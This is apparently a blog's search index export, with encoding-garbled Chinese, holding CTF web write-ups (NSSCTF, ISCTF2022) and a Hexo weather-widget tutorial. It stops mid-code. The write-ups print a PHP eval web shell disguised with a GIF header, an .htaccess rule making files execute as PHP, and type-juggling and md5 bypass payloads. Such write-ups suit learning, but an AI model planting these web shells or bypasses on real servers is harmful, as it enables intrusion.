<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSSCTF WEB åˆ·é¢˜</title>
      <link href="/archives/25716.html"/>
      <url>/archives/25716.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ç¬¬äº”ç©ºé—´-2021-WebFTP"><a href="#ç¬¬äº”ç©ºé—´-2021-WebFTP" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]WebFTP"></a>[ç¬¬äº”ç©ºé—´ 2021]WebFTP</h1><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113141842663.png"></p><p>ä»¥ä¸ºæ˜¯SQLæ³¨å…¥ï¼Œä¹Ÿæ²¡æœ‰æ‰¾åˆ°æ³¨å…¥ç‚¹</p><p>ç”¨dirsearchæ‰«æä¸€ä¸‹ç½‘å€ï¼Œå‘ç°äº†å¾ˆå¤šæ–‡ä»¶ï¼Œ</p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113142029931.png"></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113142055130.png"></p><p>ä»¥ä¸ºæ˜¯gitæ³„éœ²ï¼Œè®¿é—®.gitæ²¡æ‰¾åˆ°å¯åˆ©ç”¨çš„æ–‡ä»¶</p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113142151235.png"></p><p>å†è®¿é—®phpinfo.phpæ‰¾åˆ°flag</p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113142312298.png"></p><h1 id="GXYCTF-2019-BabyUpload"><a href="#GXYCTF-2019-BabyUpload" class="headerlink" title="[GXYCTF 2019]BabyUpload"></a>[GXYCTF 2019]BabyUpload</h1><p>.htaccessæ–‡ä»¶è§£ææ¼æ´</p><blockquote><p>.htaccessæ–‡ä»¶(æˆ–è€…â€<a href="https://so.csdn.net/so/search?q=%E5%88%86%E5%B8%83%E5%BC%8F&spm=1001.2101.3001.7020">åˆ†å¸ƒå¼</a>é…ç½®æ–‡ä»¶â€ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚</p><p>æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><p>ç¬¬ä¸€ç§ï¼š<br>AddType application&#x2F;x-httpd-php .jpg<br>å°†æ‰€æœ‰åç¼€ä¸º.jpgçš„æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è§£æ<br>ç¬¬äºŒç§ï¼š<br>&lt;FilesMatch â€œBaiZeâ€&gt;<br>setHandler application&#x2F;x-httpd-phpBZ</p><p>å°†æ‰€æœ‰æ–‡ä»¶ååŒ…å«BaiZeçš„æ–‡ä»¶ä½œä¸ºphpæ–‡ä»¶è§£æ</p><p>æ‰€ä»¥æ­¤é¢˜å°±å»ºä¸€ä¸ªå†…å®¹ä¸ºAddType application&#x2F;x-httpd-php .jpgçš„.htaccessæ–‡ä»¶ï¼Œæ³¨æ„ç›´æ¥ä¸Šä¼ æ˜¯ä¸è¡Œçš„è¦ä¿®æ”¹Content-Type: ä¸ºimage&#x2F;jpeg<br>ç„¶åå†ä¸Šä¼ æœ¨é©¬å¾—åˆ°flag</p></blockquote><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221113153117446.png"></p><p>æœ¨é©¬æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>.htaccessæ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;pass&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> åˆ·é¢˜è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åˆ·é¢˜ </tag>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸ºåšå®¢æ·»åŠ å¤©æ°”å°æ’ä»¶(Hexo Butterfly)</title>
      <link href="/archives/54385.html"/>
      <url>/archives/54385.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>é—²ç€æ— äº‹ï¼Œä¸ºè‡ªå·±çš„åšå®¢æ·»åŠ ä¸€ä¸ªå¤©æ°”å°æ’ä»¶ï¼Œä¸°å¯Œä¸€ä¸‹åšå®¢å†…å®¹</p><h1 id="æ³¨å†Œå’Œé£å¤©æ°”"><a href="#æ³¨å†Œå’Œé£å¤©æ°”" class="headerlink" title="æ³¨å†Œå’Œé£å¤©æ°”"></a>æ³¨å†Œå’Œé£å¤©æ°”</h1><p>è¿™ä¸ªæ˜¯å…è´¹çš„ï¼Œä¸æƒ³ç™½å«–çš„è¯å¯ä»¥æ³¨å†Œä¸­å›½å¤©æ°”ğŸŒ </p><p><a href="https://id.qweather.com/#/register?redirect=https%3A%2F%2Fconsole.qweather.com">å’Œé£å¤©æ°”æ³¨å†Œ</a></p><p>åœ¨å’Œé£å¤©æ°”åˆ›å»ºä¸€ä¸ª<a href="https://widget.qweather.com/create-simple">ç®€çº¦çš„æ’ä»¶</a></p><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221112113007379.png"></p><p>ç”Ÿæˆä»£ç </p><h1 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h1><h2 id="æ·»åŠ div"><a href="#æ·»åŠ div" class="headerlink" title="æ·»åŠ div"></a>æ·»åŠ div</h2><p>åœ¨    <code>blog\themes\butterfly\layout\includes\header</code>    ä¸‹é¢çš„<strong>nav.pug</strong>æ·»åŠ </p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;he-plugin-simple&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221112113624632.png"></p><h2 id="æ·»åŠ weather-js"><a href="#æ·»åŠ weather-js" class="headerlink" title="æ·»åŠ weather.js"></a>æ·»åŠ weather.js</h2><p>åœ¨  <code>blog\themes\butterfly\source\js</code>   ä¸‹é¢æ·»åŠ <strong>weather.js</strong>æ–‡ä»¶</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">WIDGET</span> = &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CONFIG&quot;</span>: &#123;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;modules&quot;</span>: <span class="string">&quot;01234&quot;</span>,</span><br><span class="line"><span class="string">&quot;background&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line"><span class="string">&quot;tmpColor&quot;</span>: <span class="string">&quot;4A86E8&quot;</span>,</span><br><span class="line"><span class="string">&quot;tmpSize&quot;</span>: <span class="string">&quot;16&quot;</span>,</span><br><span class="line"><span class="string">&quot;cityColor&quot;</span>: <span class="string">&quot;FF9900&quot;</span>,</span><br><span class="line"><span class="string">&quot;citySize&quot;</span>: <span class="string">&quot;16&quot;</span>,</span><br><span class="line"><span class="string">&quot;aqiColor&quot;</span>: <span class="string">&quot;4A86E8&quot;</span>,</span><br><span class="line"><span class="string">&quot;aqiSize&quot;</span>: <span class="string">&quot;16&quot;</span>,</span><br><span class="line"><span class="string">&quot;weatherIconSize&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line"><span class="string">&quot;alertIconSize&quot;</span>: <span class="string">&quot;18&quot;</span>,</span><br><span class="line"><span class="string">&quot;padding&quot;</span>: <span class="string">&quot;0px 0px 0px 0px&quot;</span>,</span><br><span class="line"><span class="string">&quot;shadow&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line"><span class="string">&quot;language&quot;</span>: <span class="string">&quot;auto&quot;</span>,</span><br><span class="line"><span class="string">&quot;fixed&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line"><span class="string">&quot;vertical&quot;</span>: <span class="string">&quot;center&quot;</span>,</span><br><span class="line"><span class="string">&quot;horizontal&quot;</span>: <span class="string">&quot;center&quot;</span>,</span><br><span class="line"><span class="string">&quot;left&quot;</span>: <span class="string">&quot;125&quot;</span>,</span><br><span class="line"><span class="string">&quot;top&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line"><span class="string">&quot;key&quot;</span>: <span class="string">&quot;åˆšæ‰ç”Ÿæˆä»£ç ä¸­çš„key&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æ·»åŠ scriptä»£ç "><a href="#æ·»åŠ scriptä»£ç " class="headerlink" title="æ·»åŠ scriptä»£ç "></a>æ·»åŠ scriptä»£ç </h2><p>åœ¨é…ç½®æ–‡ä»¶<code>_config.butterfly</code>çš„<strong>inject</strong>å±æ€§ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">- <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">- <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">&quot;/js/weather.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221112114208594.png"></p><blockquote><p>hexo  clean</p><p>hexo s</p><p>hexo g -d</p></blockquote><h1 id="æ·»åŠ æˆåŠŸ-ğŸ¥³"><a href="#æ·»åŠ æˆåŠŸ-ğŸ¥³" class="headerlink" title="æ·»åŠ æˆåŠŸ ğŸ¥³"></a>æ·»åŠ æˆåŠŸ ğŸ¥³</h1><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221112114328460.png"></p>]]></content>
      
      
      <categories>
          
          <category> å®‰è£…è®°å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2022  web  wp</title>
      <link href="/archives/37243.html"/>
      <url>/archives/37243.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="EASY-PHP01"><a href="#EASY-PHP01" class="headerlink" title="EASY-PHP01"></a>EASY-PHP01</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221110195454972.png" alt="image-20221110195454972"><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221110195522702.png"><br>getä¼ å‚   <strong>?hint</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;webç­¾åˆ°&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--ç»™æˆ‘ä¸€ä¸ªhintï¼Œæˆ‘ç»™ä½ ä¸€ä¸ªhint--&gt;</span><br><span class="line">&lt;!--?hint --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./flag114514.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hint&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$ISCTF</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$ISCTF</span> == <span class="number">114514</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ISCTF</span> === <span class="string">&quot;114514&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å¥½è‡­å•Š&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;= == === != !==&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ä»€ä¹ˆæ˜¯POSTï¼Ÿ&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot; ä»€ä¹ˆæ˜¯GETï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ä»€ä¹ˆæ˜¯POSTï¼Ÿ</span><br></pre></td></tr></table></figure><p>å¼±ç±»å‹æ¯”è¾ƒç»•è¿‡<br>POST:      <strong>ISCTF&#x3D;114514a</strong><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132217092.png"></p><h2 id="EASY-PHP02"><a href="#EASY-PHP02" class="headerlink" title="EASY-PHP02"></a>EASY-PHP02</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132307450.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;need_time_to_change&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="variable">$YOUR_NAME</span> = <span class="variable">$_GET</span>[<span class="string">&quot;NAME&quot;</span>];</span><br><span class="line"><span class="variable">$GET1</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET1&quot;</span>];</span><br><span class="line"><span class="variable">$GET2</span> = <span class="variable">$_POST</span>[<span class="string">&quot;GET2&quot;</span>];</span><br><span class="line"><span class="variable">$POST1</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>];</span><br><span class="line"><span class="variable">$POST2</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$YOUR_NAME</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,è¯·å¼€å§‹ä½ çš„ç­”é¢˜ã€‚&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;åšé¢˜å‰è¯·å‘Šè¯‰æˆ‘ä½ æ˜¯å°è“é²¨å—ï¼Ÿ&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$POST1</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>] != <span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>])&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&quot;P0ST1&quot;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&quot;P0ST2&quot;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$f1</span>=<span class="variable">$flag1</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;å°è“é²¨æˆåŠŸä¸€åŠ&quot;</span>.<span class="variable">$f1</span>;              </span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9]*$/&#x27;</span>,<span class="variable">$GET1</span>)) &#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$GET1</span> == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="string">&quot;å‰é¢çš„å‡ºæ¥äº†å—ï¼Ÿ&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$GET2</span>))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$GET2</span> &gt; <span class="number">678</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç­”æ¡ˆå°±åœ¨çœ¼å‰ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$YOUR_NAME</span>.<span class="string">&quot;,ä½ è§‰å¾—è¿™æ˜¯flagå—ï¼Ÿ&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;     </span><br><span class="line">            <span class="variable">$Ag</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$flag2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag666</span> = <span class="variable">$f1</span>.<span class="variable">$Ag</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag666</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">åšé¢˜å‰è¯·å‘Šè¯‰æˆ‘ä½ æ˜¯å°è“é²¨å—ï¼Ÿ</span><br></pre></td></tr></table></figure><p>å…ˆä¼ å…¥your nameè¿›å…¥ä¸‹ä¸€ä¸ªåˆ¤æ–­<br>P0ST1ä¸ç­‰äºP0ST2ï¼Œä½†æ˜¯P0ST1ç­‰äºP0ST2çš„md5å€¼,è¿™æ˜¯md5çš„å¼±ç¢°æ’<br>GET1è¿‡æ»¤äº†çº¯æ•°å­—ï¼Œç”¨å­—æ¯ç»•è¿‡ï¼ŒGET2å¤§äº678ï¼Œä¸èƒ½ä¸ºæ•°å­—ï¼Œæ•°ç»„ç»•è¿‡<br>æ„é€ payloadï¼š<br>GET:    <a href="http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a">http://120.79.18.34:20120/?NAME=111&P0ST1=0&P0ST2=s1502113478a</a><br>POST:   GET1&#x3D;a&amp;GET2[]&#x3D;690<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132428514.png"><br>å‰åŠæ®µæ˜¯hexè§£ç    ISCTF{0d4c<br>ååŠæ®µæ˜¯base64è§£ç ï¼Œå†Unicodeè§£ç     6e9a-51a9-45bf-8a6d-513cdf7b530c}</p><h2 id="FakeWeb"><a href="#FakeWeb" class="headerlink" title="FakeWeb"></a>FakeWeb</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132453482.png"><br>burpsuiteæŠ“åŒ…<br>å‘ç°è·³è½¬é¡µé¢<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132644924.png"><br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132723459.png"></p><p>ç»è¿‡æŸ¥é˜…èµ„æ–™ï¼Œå‘ç°If-None-Matchå’ŒETagæ˜¯è§£é¢˜å…³é”®ç‚¹</p><blockquote><p>å½“æµè§ˆå™¨è¯·æ±‚æœåŠ¡å™¨çš„æŸé¡¹èµ„æº(A)æ—¶, æœåŠ¡å™¨æ ¹æ®Aç®—å‡ºä¸€ä¸ªå“ˆå¸Œå€¼(3f80f-1b6-3e1cb03b)å¹¶é€šè¿‡ ETag è¿”å›ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨æŠŠâ€3f80f-1b6-3e1cb03bâ€ å’Œ A åŒæ—¶ç¼“å­˜åœ¨æœ¬åœ°ï¼Œå½“ä¸‹æ¬¡å†æ¬¡å‘æœåŠ¡å™¨è¯·æ±‚Aæ—¶ï¼Œä¼šé€šè¿‡ç±»ä¼¼ If-None-Match: â€œ3f80f-1b6-3e1cb03bâ€ çš„è¯·æ±‚å¤´æŠŠETagå‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å†æ¬¡è®¡ç®—Açš„å“ˆå¸Œå€¼å¹¶å’Œæµè§ˆå™¨è¿”å›çš„å€¼åšæ¯”è¾ƒï¼Œå¦‚æœå‘ç°Aå‘ç”Ÿäº†å˜åŒ–å°±æŠŠAè¿”å›ç»™æµè§ˆå™¨(200)ï¼Œå¦‚æœå‘ç°Aæ²¡æœ‰å˜åŒ–å°±ç»™æµè§ˆå™¨è¿”å›ä¸€ä¸ª304æœªä¿®æ”¹ã€‚è¿™æ ·é€šè¿‡æ§åˆ¶æµè§ˆå™¨ç«¯çš„ç¼“å­˜ï¼Œå¯ä»¥èŠ‚çœæœåŠ¡å™¨çš„å¸¦å®½ï¼Œå› ä¸ºæœåŠ¡å™¨ä¸éœ€è¦æ¯æ¬¡éƒ½æŠŠå…¨é‡æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br>  èªæ˜çš„æœåŠ¡å™¨å¼€å‘è€…ä¼šæŠŠETagså’ŒGETè¯·æ±‚çš„â€œIf-None-Matchâ€å¤´ä¸€èµ·ä½¿ç”¨ï¼Œè¿™æ ·å¯åˆ©ç”¨å®¢æˆ·ç«¯ï¼ˆä¾‹å¦‚æµè§ˆå™¨ï¼‰çš„ç¼“å­˜ã€‚å› ä¸ºæœåŠ¡å™¨é¦–å…ˆäº§ç”ŸETagï¼ŒæœåŠ¡å™¨å¯åœ¨ç¨åä½¿ç”¨å®ƒæ¥åˆ¤æ–­é¡µé¢æ˜¯å¦å·²ç»è¢«ä¿®æ”¹ã€‚æœ¬è´¨ä¸Šï¼Œå®¢æˆ·ç«¯é€šè¿‡å°†è¯¥è®°å·ä¼ å›æœåŠ¡å™¨è¦æ±‚æœåŠ¡å™¨éªŒè¯å…¶ï¼ˆå®¢æˆ·ç«¯ï¼‰ç¼“å­˜ã€‚<br>     å…¶è¿‡ç¨‹å¦‚ä¸‹ï¼š<br>     1. å®¢æˆ·ç«¯è¯·æ±‚ä¸€ä¸ªé¡µé¢ï¼ˆAï¼‰ã€‚ æœåŠ¡å™¨è¿”å›é¡µé¢Aï¼Œå¹¶åœ¨ç»™AåŠ ä¸Šä¸€ä¸ªETagã€‚ å®¢æˆ·ç«¯å±•ç°è¯¥é¡µé¢ï¼Œå¹¶å°†é¡µé¢è¿åŒETagä¸€èµ·ç¼“å­˜ã€‚         2. å®¢æˆ·å†æ¬¡è¯·æ±‚é¡µé¢Aï¼Œå¹¶å°†ä¸Šæ¬¡è¯·æ±‚æ—¶æœåŠ¡å™¨è¿”å›çš„ETagä¸€èµ·ä¼ é€’ç»™æœåŠ¡å™¨ã€‚<br>     3. æœåŠ¡å™¨æ£€æŸ¥è¯¥ETagï¼Œå¹¶åˆ¤æ–­å‡ºè¯¥é¡µé¢è‡ªä¸Šæ¬¡å®¢æˆ·ç«¯è¯·æ±‚ä¹‹åè¿˜æœªè¢«ä¿®æ”¹ï¼Œç›´æ¥è¿”å›å“åº”304ï¼ˆæœªä¿®æ”¹â€”â€”Not Modifiedï¼‰å’Œä¸€<br>        ä¸ªç©ºçš„å“åº”ä½“ã€‚</p></blockquote><p>å°±æ˜¯è¯´è¦If-None-Matchå’ŒETagçš„å€¼ä¸ç›¸ç­‰æ‰ä¼šè¿”å›ä¸€ä¸ªæ–°çš„é¡µé¢ï¼Œæ›´æ”¹If-None-Matchçš„å€¼ï¼Œç„¶åè¿›è¡Œå‘åŒ…<br><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132821587.png"></p><h2 id="simplephp"><a href="#simplephp" class="headerlink" title="simplephp"></a>simplephp</h2><p><img src="https://chenyxy.oss-cn-hangzhou.aliyuncs.com/img/image-20221108132851899.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;#\\\\\\\\/Ilikeisctf#&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$str</span>,<span class="variable">$arr</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good try!&quot;</span>;</span><br><span class="line">    <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span 